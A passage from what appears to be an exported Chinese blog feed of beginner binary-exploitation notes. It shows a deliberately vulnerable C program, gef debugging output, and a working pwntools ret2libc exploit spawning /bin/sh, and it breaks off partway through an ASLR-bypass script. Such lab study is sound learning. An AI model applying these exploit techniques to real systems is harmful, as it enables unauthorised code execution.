href=\"https://blog.csdn.net/fjh1997/article/details/105434992/\">https://blog.csdn.net/fjh1997/article/details/105434992/</a></p>\n<h3 id=\"pop-rsi是把它下面的那个给pop出来-还是找rsp\"><a href=\"#pop-rsi是把它下面的那个给pop出来-还是找rsp\" class=\"headerlink\" title=\"pop rsi是把它下面的那个给pop出来?还是找rsp?\"></a>pop rsi是把它下面的那个给pop出来?还是找rsp?</h3><p>​\t\t看下面的第六行,这里pop rsi的话,是放在了返回地址,所以当执行到这里的时候,上面的栈的数据就是垃圾数据了,此时pop rsi下面这里是rsp的位置??? </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  telescope</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395c0</span>│+<span class=\"number\">0x0000</span>: <span class=\"number\">0x007fff5df396c8</span>  →  <span class=\"number\">0x0000000000000000</span>        ← $rsp</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395c8</span>│+<span class=\"number\">0x0008</span>: <span class=\"number\">0x0000000100400430</span></span><br><span class=\"line\"><span class=\"number\">0x007fff5df395d0</span>│+<span class=\"number\">0x0010</span>: <span class=\"number\">0x4141414141414141</span>     ← $rsi</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395d8</span>│+<span class=\"number\">0x0018</span>: <span class=\"number\">0x4141414141414141</span></span><br><span class=\"line\"><span class=\"number\">0x007fff5df395e0</span>│+<span class=\"number\">0x0020</span>: <span class=\"number\">0x4141414141414141</span>     ← $rbp</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395e8</span>│+<span class=\"number\">0x0028</span>: <span class=\"number\">0x000000004005c1</span>  →   pop rsi</span><br><span class=\"line\"><span class=\"number\">0x007fff5df395f0</span>│+<span class=\"number\">0x0030</span>: <span class=\"number\">0x00000000601018</span>  →  <span class=\"number\">0x007fae5d96b020</span>  →  &lt;read+<span class=\"number\">0</span>&gt; lea ra</span><br><span class=\"line\">x, [rip+<span class=\"number\">0x2e09b1</span>]        # <span class=\"number\">0x7fae5dc4b9d8</span> &lt;__libc_multiple_threads&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"给的libc-so-6怎么链接\"><a href=\"#给的libc-so-6怎么链接\" class=\"headerlink\" title=\"给的libc.so.6怎么链接?\"></a>给的libc.so.6怎么链接?</h2><p>&#x2F;libc.so-3.6<br>GNU C Library (Ubuntu GLIBC 2.23-0ubuntu7) stable release version 2.23, by Roland McGrath et al.<br>Copyright (C) 2016 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.<br>There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://devcraft.io/posts/2017/04/09/start-hard-asis-ctf-quals-2017.html\">https://devcraft.io/posts/2017/04/09/start-hard-asis-ctf-quals-2017.html</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-3-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6ALSR%E5%92%8CPIE/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-3-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6ALSR%E5%92%8CPIE/",
            "title": "pwn入门-3-os保护机制ALSR和PIE",
            "date_published": "2022-11-25T08:45:37.000Z",
            "content_html": "<h1 id=\"漏洞代码\"><a href=\"#漏洞代码\" class=\"headerlink\" title=\"漏洞代码\"></a>漏洞代码</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;unistd.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">void vuln_func() &#123;</span><br><span class=\"line\">\tchar buf[<span class=\"number\">128</span>];</span><br><span class=\"line\">\tread(STDIN_FILENO, buf, <span class=\"number\">256</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> main(<span class=\"built_in\">int</span> argc, char *argv[]) &#123;</span><br><span class=\"line\">\tvuln_func();</span><br><span class=\"line\">\twrite(STDOUT_FILENO, <span class=\"string\">&quot;Hello world!\\n&quot;</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"开启NX-未开启ALSR和PIE\"><a href=\"#开启NX-未开启ALSR和PIE\" class=\"headerlink\" title=\"开启NX,未开启ALSR和PIE\"></a>开启NX,未开启ALSR和PIE</h1><p>echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x2F;&#x2F; 关闭alsr</p>\n<p>gcc -m32 -fno-stack-protector -z noexecstack dep.c</p>\n<p>编译得到a.out</p>\n<p>根据源代码可以知道,这是一个很明显有缓冲区溢出漏洞,定义的数组是128,但读入了256.</p>\n<p>修改libc为2.23</p>\n<p>patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;a.out<br>patchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;a.out</p>\n<h2 id=\"确定缓冲区大小\"><a href=\"#确定缓冲区大小\" class=\"headerlink\" title=\"确定缓冲区大小\"></a>确定缓冲区大小</h2><p>输入一点字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  telescope</span><br><span class=\"line\"><span class=\"number\">0xffffd520</span>│+<span class=\"number\">0x0000</span>: <span class=\"number\">0x00000000</span>\t ← $esp</span><br><span class=\"line\"><span class=\"number\">0xffffd524</span>│+<span class=\"number\">0x0004</span>: <span class=\"number\">0xffffd530</span>  →  <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd528</span>│+<span class=\"number\">0x0008</span>: <span class=\"number\">0x00000100</span></span><br><span class=\"line\"><span class=\"number\">0xffffd52c</span>│+<span class=\"number\">0x000c</span>: <span class=\"number\">0x5655555c</span>  →  &lt;vuln_func+<span class=\"number\">15</span>&gt; add eax, <span class=\"number\">0x1a78</span></span><br><span class=\"line\"><span class=\"number\">0xffffd530</span>│+<span class=\"number\">0x0010</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd534</span>│+<span class=\"number\">0x0014</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd538</span>│+<span class=\"number\">0x0018</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd53c</span>│+<span class=\"number\">0x001c</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd540</span>│+<span class=\"number\">0x0020</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd544</span>│+<span class=\"number\">0x0024</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\">gef➤</span><br><span class=\"line\"><span class=\"number\">0xffffd548</span>│+<span class=\"number\">0x0028</span>: <span class=\"string\">&quot;aaaaaaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd54c</span>│+<span class=\"number\">0x002c</span>: <span class=\"string\">&quot;aaaaaaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd550</span>│+<span class=\"number\">0x0030</span>: <span class=\"string\">&quot;aaaaaaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd554</span>│+<span class=\"number\">0x0034</span>: <span class=\"string\">&quot;aaaabbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd558</span>│+<span class=\"number\">0x0038</span>: <span class=\"string\">&quot;bbbb\\n&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd55c</span>│+<span class=\"number\">0x003c</span>: <span class=\"number\">0x00000a</span> (<span class=\"string\">&quot;\\n&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0xffffd560</span>│+<span class=\"number\">0x0040</span>: <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd564</span>│+<span class=\"number\">0x0044</span>: <span class=\"number\">0x2c307d</span> (<span class=\"string\">&quot;&#125;0,&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0xffffd568</span>│+<span class=\"number\">0x0048</span>: <span class=\"number\">0x00000001</span></span><br><span class=\"line\"><span class=\"number\">0xffffd56c</span>│+<span class=\"number\">0x004c</span>: <span class=\"number\">0xf7ffc900</span>  →  <span class=\"number\">0x00000000</span></span><br><span class=\"line\">gef➤</span><br><span class=\"line\"><span class=\"number\">0xffffd570</span>│+<span class=\"number\">0x0050</span>: <span class=\"number\">0xffffd5c0</span>  →  <span class=\"number\">0xffffd5e0</span>  →  <span class=\"number\">0x00000001</span></span><br><span class=\"line\"><span class=\"number\">0xffffd574</span>│+<span class=\"number\">0x0054</span>: <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd578</span>│+<span class=\"number\">0x0058</span>: <span class=\"number\">0x01000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd57c</span>│+<span class=\"number\">0x005c</span>: <span class=\"number\">0xc3442600</span></span><br><span class=\"line\"><span class=\"number\">0xffffd580</span>│+<span class=\"number\">0x0060</span>: <span class=\"number\">0x000009</span> (<span class=\"string\">&quot;\\t&quot;</span>?)</span><br><span class=\"line\"><span class=\"number\">0xffffd584</span>│+<span class=\"number\">0x0064</span>: <span class=\"number\">0xffffd7ba</span>  →  <span class=\"string\">&quot;/home/ubuntu/pwn/a.out&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd588</span>│+<span class=\"number\">0x0068</span>: <span class=\"number\">0xf7e15679</span>  →  &lt;__new_exitfn+<span class=\"number\">9</span>&gt; add ebx, <span class=\"number\">0x1a7987</span></span><br><span class=\"line\"><span class=\"number\">0xffffd58c</span>│+<span class=\"number\">0x006c</span>: <span class=\"number\">0xf7fc0808</span>  →  <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd590</span>│+<span class=\"number\">0x0070</span>: <span class=\"number\">0xf7fbd000</span>  →  <span class=\"number\">0x001d7d8c</span></span><br><span class=\"line\"><span class=\"number\">0xffffd594</span>│+<span class=\"number\">0x0074</span>: <span class=\"number\">0xf7fbd000</span>  →  <span class=\"number\">0x001d7d8c</span></span><br><span class=\"line\">gef➤</span><br><span class=\"line\"><span class=\"number\">0xffffd598</span>│+<span class=\"number\">0x0078</span>: <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd59c</span>│+<span class=\"number\">0x007c</span>: <span class=\"number\">0xf7e157db</span>  →  &lt;__internal_atexit+<span class=\"number\">59</span>&gt; add esp, <span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5a0</span>│+<span class=\"number\">0x0080</span>: <span class=\"number\">0xf7fbd3fc</span>  →  <span class=\"number\">0xf7fbe200</span>  →  <span class=\"number\">0x00000000</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5a4</span>│+<span class=\"number\">0x0084</span>: <span class=\"number\">0x56556fd4</span>  →  &lt;_GLOBAL_OFFSET_TABLE_+<span class=\"number\">0</span>&gt; fcomp QWORD PTR [esi]</span><br><span class=\"line\"><span class=\"number\">0xffffd5a8</span>│+<span class=\"number\">0x0088</span>: <span class=\"number\">0xffffd67c</span>  →  <span class=\"number\">0xffffd7d1</span>  →  <span class=\"string\">&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]&quot;</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5ac</span>│+<span class=\"number\">0x008c</span>: <span class=\"number\">0x5655561b</span>  →  &lt;__libc_csu_init+<span class=\"number\">75</span>&gt; add edi, <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5b0</span>│+<span class=\"number\">0x0090</span>: <span class=\"number\">0x00000001</span></span><br><span class=\"line\"><span class=\"number\">0xffffd5b4</span>│+<span class=\"number\">0x0094</span>: <span class=\"number\">0x56556fd4</span>  →  &lt;_GLOBAL_OFFSET_TABLE_+<span class=\"number\">0</span>&gt; fcomp QWORD PTR [esi]</span><br><span class=\"line\"><span class=\"number\">0xffffd5b8</span>│+<span class=\"number\">0x0098</span>: <span class=\"number\">0xffffd5c8</span>  →  <span class=\"number\">0x00000000</span>\t ← $ebp</span><br></pre></td></tr></table></figure>\n\n<p>0xffffd5b8 - 0xffffd520 &#x3D;  152</p>\n<p>为什么出不来书上的效果…pattern create 150那个</p>\n<p>为什么书上的和自己运行的不一样? 哪里有区别?</p>\n<p>因为减错了,应该0xffffd5b8 - 0xffffd530 &#x3D; 136才对,再+4, 140覆盖掉ebp,然后下面的就是eip了</p>\n<h3 id=\"通过gef自带的命令\"><a href=\"#通过gef自带的命令\" class=\"headerlink\" title=\"通过gef自带的命令\"></a>通过gef自带的命令</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  pattern create <span class=\"number\">150</span></span><br><span class=\"line\">[+] Generating a pattern of <span class=\"number\">150</span> <span class=\"built_in\">bytes</span> (n=<span class=\"number\">4</span>)</span><br><span class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br><span class=\"line\">[+] Saved <span class=\"keyword\">as</span> <span class=\"string\">&#x27;$_gef0&#x27;</span></span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">Starting program: /home/ubuntu/pwn/a.out</span><br><span class=\"line\">[*] Failed to find objfile <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> a valid file <span class=\"built_in\">format</span>: [Errno <span class=\"number\">2</span>] No such file <span class=\"keyword\">or</span> directory: <span class=\"string\">&#x27;system-supplied DSO at 0xf7fd8000&#x27;</span></span><br><span class=\"line\">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br><span class=\"line\"></span><br><span class=\"line\">Program received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\"><span class=\"number\">0x6261616b</span> <span class=\"keyword\">in</span> ?? ()</span><br><span class=\"line\">gef➤  pattern offset <span class=\"number\">0x6261616b</span></span><br><span class=\"line\">[+] Searching <span class=\"keyword\">for</span> <span class=\"string\">&#x27;0x6261616b&#x27;</span></span><br><span class=\"line\">[+] Found at offset <span class=\"number\">140</span> (little-endian search) likely</span><br><span class=\"line\">[+] Found at offset <span class=\"number\">1004</span> (big-endian search)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"构造exp\"><a href=\"#构造exp\" class=\"headerlink\" title=\"构造exp\"></a>构造exp</h2><p>整理思路就是返回地址设置为 system,然后给一个参数&#x2F;bin&#x2F;sh就好了</p>\n<p>问题就是寻找它俩的地址,关闭ALSR的情况下,libc的地址是固定的,可以在调试中确认system和&#x2F;bin&#x2F;sh的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  p system</span><br><span class=\"line\">$<span class=\"number\">1</span> = &#123;<span class=\"built_in\">int</span> (const char *)&#125; <span class=\"number\">0xf7e57db0</span> &lt;__libc_system&gt;</span><br><span class=\"line\">gef➤  search-pattern <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">[+] Searching <span class=\"string\">&#x27;/bin/sh&#x27;</span> <span class=\"keyword\">in</span> memory</span><br><span class=\"line\">[+] In <span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>(<span class=\"number\">0xf7e1d000</span>-<span class=\"number\">0xf7fcd000</span>), permission=r-x</span><br><span class=\"line\">  <span class=\"number\">0xf7f78b2b</span> - <span class=\"number\">0xf7f78b32</span>  →   <span class=\"string\">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>给的exp同样会有问题(注意 system和&#x2F;bin&#x2F;sh地址要根据实际情况修改,修改了也不行</p>\n<p>[*] Got EOF while sending in interactive</p>\n<p>默认开启了其他保护?????? gcc的问题???</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/pwn<span class=\"comment\"># python3 exp1.py</span></span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./a.out&#x27;</span>: pid <span class=\"number\">5096</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/pwn/a.out&#x27;</span></span><br><span class=\"line\">    Arch:     i386-<span class=\"number\">32</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>gcc -m32 -fno-stack-protector -z noexecstack -z norelro dep.c -fno-pie -no-pie -o a.out</p>\n<p>全关了也不行啊</p>\n<p>libc的保护为什么不影响呢??</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  p system</span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;<span class=\"built_in\">int</span> (const char *)&#125; <span class=\"number\">0xf7e223d0</span> &lt;__libc_system&gt;</span><br><span class=\"line\">gef➤  search-pattern <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">[+] Searching <span class=\"string\">&#x27;/bin/sh&#x27;</span> <span class=\"keyword\">in</span> memory</span><br><span class=\"line\">[+] In <span class=\"string\">&#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;</span>(<span class=\"number\">0xf7de5000</span>-<span class=\"number\">0xf7fba000</span>), permission=r-x</span><br><span class=\"line\">  <span class=\"number\">0xf7f631db</span> - <span class=\"number\">0xf7f631e2</span>  →   <span class=\"string\">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>调试一下,这种如何调试呢??????</p>\n<p>0xf7e57db0</p>\n<p>0xf7f78b2b</p>\n<p>不知道为什么,重新编译了一遍就好了….太奇怪了</p>\n<h3 id=\"如何动态获取这俩地址呢\"><a href=\"#如何动态获取这俩地址呢\" class=\"headerlink\" title=\"如何动态获取这俩地址呢?\"></a>如何动态获取这俩地址呢?</h3><p>system_addr &#x3D; libc.sym[‘system’] 这样是不行的,这个获取的是在libc里面的偏移,需要获取libc的加载地址</p>\n<p>需要基地址,基地址怎么获取呢? 如果没开启ALSR和PIE的话,可以通过调试获取,pwntools里不能直接获取吗?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">[ Legend:  Code | Heap | Stack ]</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\"><span class=\"number\">0x8047000</span> <span class=\"number\">0x8048000</span> <span class=\"number\">0x000000</span> rw- /home/ubuntu/pwn/a.out</span><br><span class=\"line\"><span class=\"number\">0x8048000</span> <span class=\"number\">0x8049000</span> <span class=\"number\">0x001000</span> r-x /home/ubuntu/pwn/a.out</span><br><span class=\"line\"><span class=\"number\">0x8049000</span> <span class=\"number\">0x804a000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/a.out</span><br><span class=\"line\"><span class=\"number\">0xf7e1c000</span> <span class=\"number\">0xf7e1d000</span> <span class=\"number\">0x000000</span> rw-</span><br><span class=\"line\"><span class=\"number\">0xf7e1d000</span> <span class=\"number\">0xf7fcd000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/glibc-<span class=\"built_in\">all</span>-<span class=\"keyword\">in</span>-one/libs/<span class=\"number\">2.23</span>-0ubuntu11<span class=\"number\">.3</span>_i386/libc-<span class=\"number\">2.23</span>.so</span><br></pre></td></tr></table></figure>\n\n<p>0xf7e1d000  + 0x3adb0 &#x3D;  0xf7e57db0 这样就对上了</p>\n<p>system_addr &#x3D; 0xf7e1d000 + libc.sym[‘system’] 就可以得到system的地址了</p>\n<p>但是 binsh_addr &#x3D; 0xf7e1d000 + libc.search(b’&#x2F;bin&#x2F;sh’) 这个不会,会报错 </p>\n<p>oooooo需要加一个next</p>\n<p>binsh_addr &#x3D; 0xf7e1d000 + next(libc.search(b’&#x2F;bin&#x2F;sh’))</p>\n<h3 id=\"最后exp\"><a href=\"#最后exp\" class=\"headerlink\" title=\"最后exp\"></a>最后exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./a.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ret = <span class=\"number\">0xdeadbeef</span></span><br><span class=\"line\">system_addr = <span class=\"number\">0xf7e1d000</span> + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = <span class=\"number\">0xf7e1d000</span> + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#system_addr = 0xf7e57db0</span></span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = 0xf7f78b2b</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(ret) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"在此基础之上-开启ALSR\"><a href=\"#在此基础之上-开启ALSR\" class=\"headerlink\" title=\"在此基础之上,开启ALSR\"></a>在此基础之上,开启ALSR</h1><p>echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<p>gcc -m32 -fno-stack-protector -z noexecstack -no-pie dep.c -o nopie.out</p>\n<p>echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>\n<p>cp ..&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;libc.so.6 .&#x2F;</p>\n<p>ASLR改变的是堆、栈、共享库(libc等)的位置,程序本身的地址是不变的,也就是vuln_func,main等这些地址.</p>\n<h2 id=\"构造exp-1\"><a href=\"#构造exp-1\" class=\"headerlink\" title=\"构造exp\"></a>构造exp</h2><p>那为啥exp中的write也是不变的呢??????因为这个write是plt中的write,不是libc中的,所以和延迟绑定有关?</p>\n<p>0x8048320是write的地址,它是plt表的地址,所以,什么是plt表呢?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt:08048320 _write          proc near               ; CODE XREF: main+2D↓p</span><br><span class=\"line\">.plt:08048320                 jmp     ds:off_804A014</span><br><span class=\"line\">.plt:08048320 _write          endp</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于plt表\"><a href=\"#关于plt表\" class=\"headerlink\" title=\"关于plt表\"></a>关于plt表</h3><p><a href=\"https://blog.csdn.net/qq_38350702/article/details/123387642\">https://blog.csdn.net/qq_38350702&#x2F;article&#x2F;details&#x2F;123387642</a></p>\n<p>所以说应该是plt表地址我们是知道的,但是got不知道,通过plt泄露got,进而得到system的got</p>\n<p>因为system不在plt里,无法直接用system的plt</p>\n<p>思路就是先用write泄露write在内存中的位置,然后利用write在libc中和system的偏移,进行计算system和&#x2F;bin&#x2F;sh</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span 